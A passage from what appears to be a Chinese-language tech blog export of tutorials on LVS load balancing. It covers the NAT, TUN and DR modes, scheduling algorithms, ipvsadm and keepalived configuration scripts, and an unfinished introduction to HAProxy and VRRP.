&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户请发送向负载均衡服务器发送请求。负载均衡器接受客户的请求，然后先是根据LVS的调度算法（8种）来决定要将这个请求发送给哪个节点服务器。然后依据自己的工作模式（3种）来看应该如何把这些客户的请求如何发送给节点服务器，节点服务器又应该如何来把响应数据包发回给客户端。恩，那这样我们就只要接下来搞懂LVS的3中工作模式，8种调度算法就可以了。 LVS的三种工作模式： VS/NAT模式（Network address translation） VS/TUN模式（tunneling） DR模式（Direct routing） 1、NAT模式-网络地址转换&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Virtualserver via Network address translation(VS/NAT) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个是通过网络地址转换的方法来实现调度的。首先调度器(LB)接收到客户的请求数据包时（请求的目的IP为VIP），根据调度算法决定将请求发送给哪个后端的真实服务器（RS）。然后调度就把客户端发送的请求数据包的目标IP地址及端口改成后端真实服务器的IP地址（RIP）,这样真实服务器（RS）就能够接收到客户的请求数据包了。真实服务器响应完请求后，查看默认路由（NAT模式下我们需要把RS的默认路由设置为LB服务器。）把响应后的数据包发送给LB,LB再接收到响应包后，把包的源地址改成虚拟地址（VIP）然后发送回给客户端。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;调度过程IP包详细图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原理图简述： 客户端请求数据，目标IP为VIP 请求数据到达LB服务器，LB根据调度算法将目的地址修改为RIP地址及对应端口（此RIP地址是根据调度算法得出的。）并在连接HASH表中记录下这个连接。 数据包从LB服务器到达RS服务器webserver，然后webserver进行响应。Webserver的网关必须是LB，然后将数据返回给LB服务器。 收到RS的返回后的数据，根据连接HASH表修改源地址VIP&amp;目标地址CIP，及对应端口80.然后数据就从LB出发到达客户端。 客户端收到的就只能看到VIP\DIP信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;NAT模式优缺点： NAT技术将请求的报文和响应的报文都需要通过LB进行地址改写，因此网站访问量比较大的时候LB负载均衡调度器有比较大的瓶颈，一般要求最多之能10-20台节点 只需要在LB上配置一个公网IP地址就可以了。 每台内部的节点服务器的网关地址必须是调度器LB的内网地址。 NAT模式支持对IP地址和端口进行转换。即用户请求的端口和真实服务器的端口可以不一致。 2、TUN模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;virtual server via ip tunneling模式:采用NAT模式时，由于请求和响应的报文必须通过调度器地址重写，当客户请求越来越多时，调度器处理能力将成为瓶颈。为了解决这个问题，调度器把请求的报文通过IP隧道转发到真实的服务器。真实的服务器将响应处理后的数据直接返回给客户端。这样调度器就只处理请求入站报文，由于一般网络服务应答数据比请求报文大很多，采用VS/TUN模式后，集群系统的最大吞吐量可以提高10倍。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VS/TUN的工作流程图如下所示，它和NAT模式不同的是，它在LB和RS之间的传输不用改写IP地址。而是把客户请求包封装在一个IP tunnel里面，然后发送给RS节点服务器，节点服务器接收到之后解开IP tunnel后，进行响应处理。并且直接把包通过自己的外网地址发送给客户不用经过LB服务器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tunnel原理流程图: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原理图过程简述： 客户请求数据包，目标地址VIP发送到LB上。 LB接收到客户请求包，进行IP Tunnel封装。即在原有的包头加上IP Tunnel的包头。然后发送出去。 RS节点服务器根据IP Tunnel包头信息（此时就又一种逻辑上的隐形隧道，只有LB和RS之间懂）收到请求包，然后解开IP Tunnel包头信息，得到客户的请求包并进行响应处理。4.响应处理完毕之后，RS服务器使用自己的出公网的线路，将这个响应数据包发送给客户端。源IP地址还是VIP地址。（RS节点服务器需要在本地回环接口配置VIP，后续会讲） 3、DR模式（直接路由模式）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Virtual server via direct routing (vs/dr) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DR模式是通过改写请求报文的目标MAC地址，将请求发给真实服务器的，而真实服务器响应后的处理结果直接返回给客户端用户。同TUN模式一样，DR模式可以极大的提高集群系统的伸缩性。而且DR模式没有IP隧道的开销，对集群中的真实服务器也没有必要必须支持IP隧道协议的要求。但是要求调度器LB与真实服务器RS都有一块网卡连接到同一物理网段上，必须在同一个局域网环境。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DR模式是互联网使用比较多的一种模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DR模式原理图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DR模式原理过程简述： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VS/DR模式的工作流程图如上图所示，它的连接调度和管理与NAT和TUN中的一样，它的报文转发方法和前两种不同。DR模式将报文直接路由给目标真实服务器。在DR模式中，调度器根据各个真实服务器的负载情况，连接数多少等，动态地选择一台服务器，不修改目标IP地址和目标端口，也不封装IP报文，而是将请求报文的数据帧的目标MAC地址改为真实服务器的MAC地址。然后再将修改的数据帧在服务器组的局域网上发送。因为数据帧的MAC地址是真实服务器的MAC地址，并且又在同一个局域网。那么根据局域网的通讯原理，真实复位是一定能够收到由LB发出的数据包。真实服务器接收到请求数据包的时候，解开IP包头查看到的目标IP是VIP。（此时只有自己的IP符合目标IP才会接收进来，所以我们需要在本地的回环借口上面配置VIP。另：由于网络接口都会进行ARP广播响应，但集群的其他机器都有这个VIP的lo接口，都响应就会冲突。所以我们需要把真实服务器的lo接口的ARP响应关闭掉。）然后真实服务器做成请求响应，之后根据自己的路由信息将这个响应数据包发送回给客户，并且源IP地址还是VIP。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DR模式小结： 通过在调度器LB上修改数据包的目的MAC地址实现转发。注意源地址仍然是CIP，目的地址仍然是VIP地址。 请求的报文经过调度器，而RS响应处理后的报文无需经过调度器LB，因此并发访问量大时使用效率很高（和NAT模式比） 因为DR模式是通过MAC地址改写机制实现转发，因此所有RS节点和调度器LB只能在一个局域网里面 RS主机需要绑定VIP地址在LO接口上，并且需要配置ARP抑制。 RS节点的默认网关不需要配置成LB，而是直接配置为上级路由的网关，能让RS直接出网就可以。 由于DR模式的调度器仅做MAC地址的改写，所以调度器LB就不能改写目标端口，那么RS服务器就得使用和VIP相同的端口提供服务。 官方三种负载均衡技术比较总结表： 工作模式 VS/NAT VS/TUN VS/DR Real server（节点服务器） Config dr gw Tunneling Non-arp device/tie vip Server Network Private LAN/WAN LAN Server number（节点数量） Low 10-20 High 100 High 100 Real server gateway Load balance Own router Own router 优点 地址和端口转换 Wan环境加密数据 性能最高 缺点 效率低 需要隧道支持 不能跨域LAN LVS调度算法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最好参考此文章：http://www.linuxvirtualserver.org/zh/lvs4.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Lvs的调度算法决定了如何在集群节点之间分布工作负荷。当director调度器收到来自客户端访问VIP的上的集群服务的入站请求时，director调度器必须决定哪个集群节点应该处理请求。Director调度器用的调度方法基本分为两类： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;固定调度算法：rr，wrr，dh，sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;动态调度算法：wlc，lc，lblc，lblcr 算法 说明 rr 轮询算法，它将请求依次分配给不同的rs节点，也就是RS节点中均摊分配。这种算法简单，但只适合于RS节点处理性能差不多的情况 wrr 加权轮训调度，它将依据不同RS的权值分配任务。权值较高的RS将优先获得任务，并且分配到的连接数将比权值低的RS更多。相同权值的RS得到相同数目的连接数。 Wlc 加权最小连接数调度，假设各台RS的全职依次为Wi，当前tcp连接数依次为Ti，依次去Ti/Wi为最小的RS作为下一个分配的RS Dh 目的地址哈希调度（destination hashing）以目的地址为关键字查找一个静态hash表来获得需要的RSSH源地址哈希调度（source hashing）以源地址为关键字查找一个静态hash表来获得需要的RS Lc 最小连接数调度（least-connection）,IPVS表存储了所有活动的连接。LB会比较将连接请求发送到当前连接最少的RS. Lblc 基于地址的最小连接数调度（locality-based least-connection）：将来自同一个目的地址的请求分配给同一台RS，此时这台服务器是尚未满负荷的。否则就将这个请求分配给连接数最小的RS，并以它作为下一次分配的首先考虑。 LVS调度算法的生产环境选型： 一般的网络服务，如http，mail，mysql等常用的LVS调度算法为： 基本轮询调度rr 加权最小连接调度wlc 加权轮询调度wrc 基于局部性的最小连接lblc和带复制的给予局部性最小连接lblcr主要适用于web cache和DB cache 源地址散列调度SH和目标地址散列调度DH可以结合使用在防火墙集群中，可以保证整个系统的出入口唯一。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实际适用中这些算法的适用范围很多，工作中最好参考内核中的连接调度算法的实现原理，然后根据具体的业务需求合理的选型。 小结&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上lvs的原理部分就到这里，个人还是觉得像要对LVS有一个比较全面的认识，还是需要去将官方文档认真的看过一遍。主要部分还是在于3种工作方式和8种调度算法。以及实际工作种什么样的生产环境适用哪种调度算法。]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[keepalived 单独配置文件]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F4.%20keepalived%20%E5%8D%95%E7%8B%AC%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[keepalived 的配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; lihuiyw@jd.com &#125; notification_email_from lihuiyw@jd.com smtp_server mail.jd.com smtp_connect_timeout 30 router_id LVS_DEVEL&#125;vrrp_script check_alive&#123; script "/export/sh/check_nginx_alive.sh" # check every 2 seconds interval 2 # if failed, decrease 10 of the priority weight -10 # require 2 failures for failures fail 2 # require 1 sucesses for ok rise 1&#125;vrrp_instance VIP_$&#123;routerid&#125;&#123; state $role interface $interface virtual_router_id $routerid priority $weight advert_int 2 garp_master_delay 10 smtp_alert authentication &#123; auth_type PASS auth_pass 123456 &#125; virtual_ipaddress &#123; $&#123;vip&#125;/24 &#125; track_interface &#123; $interface &#125; track_script &#123; check_alive &#125;&#125;]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS的DR设置]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F16.%20LVS%E7%9A%84DR%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[LVS的DR设置1.环境说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;三台机器 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;director （eth0： 192.168.0.67， vip eth0:0： 192.168.0.64） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;real server1 （eth0 rip：192.168.0.66 ，vip lo:0：192.168.0.64） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;real server2 （eth0 rip：192.168.0.65 ，vip lo:0：192.168.0.64） 2.编写脚本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;director 上执行 1[root@dir ~]# vim /usr/local/sbin/lvs_dr.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加内容 123456789101112#! /bin/bashecho 1 &gt; /proc/sys/net/ipv4/ip_forwardipv=/sbin/ipvsadmvip=192.168.0.64rs1=192.168.0.66rs2=192.168.0.65ifconfig eth0:0 $vip broadcast $vip netmask 255.255.255.255 uproute add -host $vip dev eth0:0$ipv -C$ipv -A -t $vip:80 -s rr $ipv -a -t $vip:80 -r $rs1:80 -g -w 1$ipv -a -t $vip:80 -r $rs2:80 -g -w 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后在两台 rs 上执行 1vim /usr/local/sbin/lvs_dr_rs.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加内容 12345678#! /bin/bashvip=192.168.0.64ifconfig lo:0 $vip broadcast $vip netmask 255.255.255.255 up route add -host $vip lo:0echo "1" &gt;/proc/sys/net/ipv4/conf/lo/arp_ignoreecho "2" &gt;/proc/sys/net/ipv4/conf/lo/arp_announceecho "1" &gt;/proc/sys/net/ipv4/conf/all/arp_ignoreecho "2" &gt;/proc/sys/net/ipv4/conf/all/arp_announce &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于 arp_ignore 和 arp_announce 参考：LVS负载均衡中arp_ignore和arp_annonuce参数配置的含义 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后 driector 上执行 1[root@dir ~]# sh /usr/local/sbin/lvs_dr.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两台 rs 上执行 1sh /usr/local/sbin/lvs_dr_rs.sh 3.测试&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;windows 下浏览器测试访问 http://192.168.0.64 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更换浏览器 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者换台计算机用 curl]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS的NAT设置]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F17.%20LVS%E7%9A%84NAT%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[LVS的NAT设置1.环境说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;三台服务器一台作为 director ，两台作为 real server ，Diretcor 有一个外网 ip （192.168.119.110）和一个内网 ip（192.168.0.67），两个 real server 上只有内网 ip （192.168.0.66）和（192.168.0.65）并且需要把两个 real server 的内网网关设置为 diretcor 的内网 ip （192.168.0.67） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改 hostname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dir 192.168.0.67 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rs1 192.168.0.66 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rs2 192.168.0.65 2.安装和配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个 real server 上都安装 nginx 服务 1yum install -y nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;director 上安装 ipvsadm 1[root@dir ~]# yum install -y ipvsadm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Director 上编辑 nat 实现脚本 1[root@dir ~]# vim /usr/local/sbin/lvs_nat.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入一下内容 12345678910111213141516171819#! /bin/bash# director 服务器上开启路由转发功能: echo 1 &gt; /proc/sys/net/ipv4/ip_forward # 关闭icmp的重定向echo 0 &gt; /proc/sys/net/ipv4/conf/all/send_redirectsecho 0 &gt; /proc/sys/net/ipv4/conf/default/send_redirectsecho 0 &gt; /proc/sys/net/ipv4/conf/eth0/send_redirectsecho 0 &gt; /proc/sys/net/ipv4/conf/eth1/send_redirects# director 设置nat防火墙iptables -t nat -Fiptables -t nat -Xiptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j MASQUERADE# director设置ipvsadmIPVSADM='/sbin/ipvsadm'$IPVSADM -C$IPVSADM -A -t 192.168.119.110:80 -s lc -p 300$IPVSADM -a -t 192.168.119.110:80 -r 192.168.0.66:80 -m -w 1$IPVSADM -a -t 192.168.119.110:80 -r 192.168.0.65:80 -m -w 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，在 Director 上直接运行这个脚本就可以完成 lvs/nat 的配置了。 1[root@dir ~]# sh /usr/local/sbin/lvs_nat.sh 3.测试&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过浏览器测试两台机器上的 web 内容 http://192.168.119.110 。为了区分开，可以把 nginx 的默认页修改一下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 rs1 上执行 1[root@rs1 ~]# echo "rs1rs1" &gt; /usr/share/nginx/html/index.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 rs2 上执行 1[root@rs2 ~]# echo "rs2rs2" &gt; /usr/share/nginx/html/index.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，切记一定要在两台 rs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;刷新一下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者使用 curl]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS结合keepalived配置]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F19.%20LVS%E7%BB%93%E5%90%88keepalived%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[LVS结合keepalived配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为 NAT、DR 已经配置过一些操作，而使用 keepalived 操作和以前的操作是有些冲突的，所以先做一些处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 dr 上执行 ： 12[root@dir ~]# ipvsadm -C[root@dir ~]# ifconfig eth0:0 down &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么要引入 keepalived ，之前的 lvs 虽然已经配置成功也实现了负载均衡，但是测试的时候发现，当某台 real server 把 nginx 停掉，那么 director 照样会把请求转发过去，这样就造成了某些请求不正常。所以需要有一种机制用来检测 real server 的状态，也就是 keepalived 。它的作用除了可以检测 RS 状态外，还可以检测备用 director 的状态，也就是说 keepalived 可以实现 HA 集群的功能，当然也需要一台备用 director 服务器。备用 director 也需要安装一下 keepalived 软件。两台 director 上都执行命令： 1yum install -y keepalived &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主 director 上安装好后，编辑配置文件 1[root@dir ~]# vim /etc/keepalived/keepalived.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入或更改如下配置 12345678910111213141516171819202122232425262728293031323334353637383940vrrp_instance VI_1 &#123; state MASTER #备用服务器上为 BACKUP interface eth0 virtual_router_id 51 priority 100 #备用服务器上为90 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.0.64 &#125;&#125;virtual_server 192.168.0.64 80 &#123; delay_loop 6 #(每隔10秒查询realserver状态) lb_algo wlc #(lvs 算法) lb_kind DR #(Direct Route) persistence_timeout 60 #(同一IP的连接60秒内被分配到同一台realserver) protocol TCP #(用TCP协议检查realserver状态) real_server 192.168.0.66 80 &#123; weight 100 #(权重) TCP_CHECK &#123; connect_timeout 10 #(10秒无响应超时) nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125; real_server 192.168.0.65 80 &#123; weight 100 TCP_CHECK &#123; connect_timeout 10 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上为主 director 的配置文件，从 director 的配置文件只需要修改如下内容 12state MASTER -&gt; state BACKUPpriority 100 -&gt; priority 90 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改后从配置为 12345678910111213141516171819202122232425262728293031323334353637383940vrrp_instance VI_1 &#123; state BACKUP #主服务器上为 MASTER interface eth0 virtual_router_id 51 priority 90 #主服务器上为100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.0.64 &#125;&#125;virtual_server 192.168.0.64 80 &#123; delay_loop 6 #(每隔10秒查询realserver状态) lb_algo wlc #(lvs 算法) lb_kind DR #(Direct Route) persistence_timeout 60 #(同一IP的连接60秒内被分配到同一台realserver) protocol TCP #(用TCP协议检查realserver状态) real_server 192.168.0.66 80 &#123; weight 100 #(权重) TCP_CHECK &#123; connect_timeout 10 #(10秒无响应超时) nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125; real_server 192.168.0.65 80 &#123; weight 100 TCP_CHECK &#123; connect_timeout 10 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置完成 keepalived 后，需要开启端口转发（主从都要做） 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，两个 rs 上执行 /usr/local/sbin/lvs_dr_rs.sh 脚本 1sh /usr/local/sbin/lvs_dr_rs.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，两个 director 上启动 keepalived 服务（先主后从） 1/etc/init.d/keepalived start]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[haproxy+keepalived实现高可用负载均衡]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F20.%20%20haproxy%2Bkeepalived%E5%AE%9E%E7%8E%B0%E9%AB%98%E5%8F%AF%E7%94%A8%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%2F</url>
    <content type="text"><![CDATA[haproxy+keepalived实现高可用负载均衡&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;软件负载均衡一般通过两种方式来实现：基于操作系统的软负载实现和基于第三方应用的软负载实现。LVS就是基于Linux操作系统实现的一种软负载，HAProxy就是开源的并且基于第三应用实现的软负载。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HAProxy相比LVS的使用要简单很多，功能方面也很丰富。当 前，HAProxy支持两种主要的代理模式:”tcp”也即4层（大多用于邮件服务器、内部协议通信服务器等），和7层（HTTP）。在4层模式 下，HAProxy仅在客户端和服务器之间转发双向流量。7层模式下，HAProxy会分析协议，并且能通过允许、拒绝、交换、增加、修改或者删除请求 (request)或者回应(response)里指定内容来控制协议，这种操作要基于特定规则。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在用HAProxy主要在于它有以下优点，这里总结下： 免费开源，稳定性也是非常好，这个可通过我做的一些小项目可以看出来，单Haproxy也跑得不错，稳定性可以与LVS相媲美； 根据官方文档，HAProxy可以跑满10Gbps-New benchmark of HAProxy at 10 Gbps using Myricom’s 10GbE NICs (Myri-10G PCI-Express)，这个作为软件级负载均衡，也是比较惊人的； HAProxy可以作为MySQL、邮件或其它的非web的负载均衡，我们常用于它作为MySQL(读)负载均衡； 自带强大的监控服务器状态的页面，实际环境中我们结合Nagios进行邮件或短信报警，这个也是我非常喜欢它的原因之一； HAProxy支持虚拟主机。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在做反向代理服务器的负载均衡时，我们通常会使用nginx的均衡配置。其实，haproxy的负载均衡也是属于这一类的。那么关于这方面的配置过程我们现在来进行一下讲解。首先，对haproxy进行一个简单的介绍，之后就是安装和配置环节了。 HAProxy介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反向代理服务器,支持双机热备支持虚拟主机,但其配置简单,拥有非常不错的服务器健康检查功能,当其代理的后端服务器出现故障, HAProxy会自动将该服务器摘除,故障恢复后再自动将该服务器加入｡新的1.3引入了frontend,backend；frontend根据任意 HTTP请求头内容做规则匹配,然后把请求定向到相关的backend. http://blog.liuts.com/post/223/ （搭建四层负载均衡器） keepalived简介 http://www.keepalived.org &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived是一个类似于layer3, 4 &amp; 5交换机制的软件，也就是我们平时说的第3层、第4层和第5层交换。Keepalived的作用是检测web服务器的状态，如果有一台web服务器死机，或工作出现故障，Keepalived将检测到，并将有故障的web服务器从系统中剔除，当web服务器工作正常后Keepalived自动将web服务器加入到服务器群中，这些工作全部自动完成，不需要人工干涉，需要人工做的只是修复故障的web服务器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;类似的HA工具还有heatbeat、drbd等，heatbeat、drbd配置都较为复杂。 keepalived理论工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived可提供vrrp以及health-check功能，可以只用它提供双机浮动的vip（vrrp虚拟路由功能），这样可以简单实现一个双机热备高可用功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived是一个类似于layer3, 4 &amp; 5交换机制的软件，也就是我们平时说的第3层、第4层和第5层交换。Keepalived的作用是检测web 服务器的状态。 Layer3,4&amp;5工作在IP/TCP协议栈的IP层，TCP层，及应用层,原理分别如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Layer3：Keepalived使用Layer3的方式工作式时，Keepalived会定期向服务器群中的服务器 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发送一个ICMP的数据包（既我们平时用的Ping程序）,如果发现某台服务的IP地址没有激活，Keepalived便报告这台服务器失效，并将它从服务器群中剔除，这种情况的典型例子是某台服务器被非法关机。Layer3的方式是以服务器的IP地址是否有效作为服务器工作正常与否的标准。在本文中将采用这种方式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Layer4:如果您理解了Layer3的方式，Layer4就容易了。Layer4主要以TCP端口的状态来决定服务器工作正常与否。如web server的服务端口一般是80，如果Keepalived检测到80端口没有启动，则Keepalived将把这台服务器从服务器群中剔除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Layer5：Layer5就是工作在具体的应用层了，比Layer3,Layer4要复杂一点，在网络上占用的带宽也要大一些。Keepalived将根据用户的设定检查服务器程序的运行是否正常，如果与用户的设定不相符，则Keepalived将把服务器从服务器群中剔除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vip即虚拟ip，是附在主机网卡上的，即对主机网卡进行虚拟，此IP仍然是占用了此网段的某个IP。 keepalived作用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;随着你的网站业务量的增长你网站的服务器压力越来越大？需要负载均衡方案！商业的硬件如F5又太贵，你们又是创业型互联公司如何有效节约成本，节省不必要的浪费？同时实现商业硬件一样的高性能高可用的功能？有什么好的负载均衡可伸张可扩展的方案吗？答案是肯定的！有！我们利用 LVS+Keepalived基于完整开源软件的架构可以为你提供一个负载均衡及高可用的服务器。 LVS+Keepalived 介绍LVS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LVS是Linux Virtual Server的简写，意即Linux虚拟服务器，是一个虚拟的服务器集群系统。本项目在1998年5月由章文嵩博士成立，是中国国内最早出现的自由软件项目之一.目前有三种IP负载均衡技术（VS/NAT、VS/TUN和VS/DR）八种调度算法（rr,wrr,lc,wlc,lblc,lblcr,dh,sh）。 Keepalvied&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Keepalived在这里主要用作RealServer的健康状态检查以及LoadBalance主机和BackUP主机之间failover的实现。keepalived简介 keepalived是一个类似于layer3, 4 &amp; 5交换机制的软件，也就是我们平时说的第3层、第4层和第5层交换。Keepalived的作用是检测web服务器的状态，如果有一台web服务器死机，或工作出现故障，Keepalived将检测到，并将有故障的web服务器从系统中剔除，当web服务器工作正常后Keepalived自动将web服务器加入到服务器群中，这些工作全部自动完成，不需要人工干涉，需要人工做的只是修复故障的web服务器。 Keepalived介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Keepalived是一个基于VRRP协议来实现的WEB 服务高可用方案，可以利用其来避免单点故障。一个WEB服务至少会有2台服务器运行Keepalived，一台为主服务器（MASTER），一台为备份服务器（BACKUP），但是对外表现为一个虚拟IP，主服务器会发送特定的消息给备份服务器，当备份服务器收不到这个消息的时候，即主服务器宕机的时候，备份服务器就会接管虚拟IP，继续提供服务，从而保证了高可用性。 12345+-------------VIP(192.168.0.7)------------------+| | || | |server(MASTER) &lt;----keepalived----&gt; server(BACKUP)(192.168.0.1) (192.168.0.2) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived是VRRP的完美实现，因此在介绍keepalived之前，先介绍一下VRRP的原理。 VRRP协议简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在现实的网络环境中，两台需要通信的主机大多数情况下并没有直接的物理连接。对于这样的情况，它们之间路由怎样选择？主机如何选定到达目的主机的下一跳路由，这个问题通常的解决方法有二种： 在主机上使用动态路由协议(RIP、OSPF等) 在主机上配置静态路由 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;很明显，在主机上配置路态路由是非常不切实际的，因为管理、维护成本以及是否支持等诸多问题。配置静态路由就变得十分流行，但路由器(或者说默认网关default gateway)却经常成为单点。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VRRP的目的就是为了解决静态路由单点故障问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VRRP通过一竞选(election)协议来动态的将路由任务交给LAN中虚拟路由器中的某台VRRP路由器。 工作机制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一个VRRP虚拟路由器中，有多台物理的VRRP路由器，但是这多台的物理的机器并不能同时工作，而是由一台称为MASTER的负责路由工作，其它的都是BACKUP，MASTER并非一成不变，VRRP让每个VRRP路由器参与竞选，最终获胜的就是MASTER。MASTER拥有一些特权，比如 拥有虚拟路由器的IP地址，我们的主机就是用这个IP地址作为静态路由的。拥有特权的MASTER要负责转发发送给网关地址的包和响应ARP请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;VRRP通过竞选协议来实现虚拟路由器的功能，所有的协议报文都是通过IP多播(multicast)包(多播地址 224.0.0.18)形式发送的。虚拟路由器由VRID(范围0-255)和一组IP地址组成，对外表现为一个周知的MAC地址。所以，在一个虚拟路由 器中，不管谁是MASTER，对外都是相同的MAC和IP(称之为VIP)。客户端主机并不需要因为MASTER的改变而修改自己的路由配置，对他们来 说，这种主从的切换是透明的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一个虚拟路由器中，只有作为MASTER的VRRP路由器会一直发送VRRP广告包(VRRPAdvertisement message)，BACKUP不会抢占MASTER，除非它的优先级(priority)更高。当MASTER不可用时(BACKUP收不到广告包)， 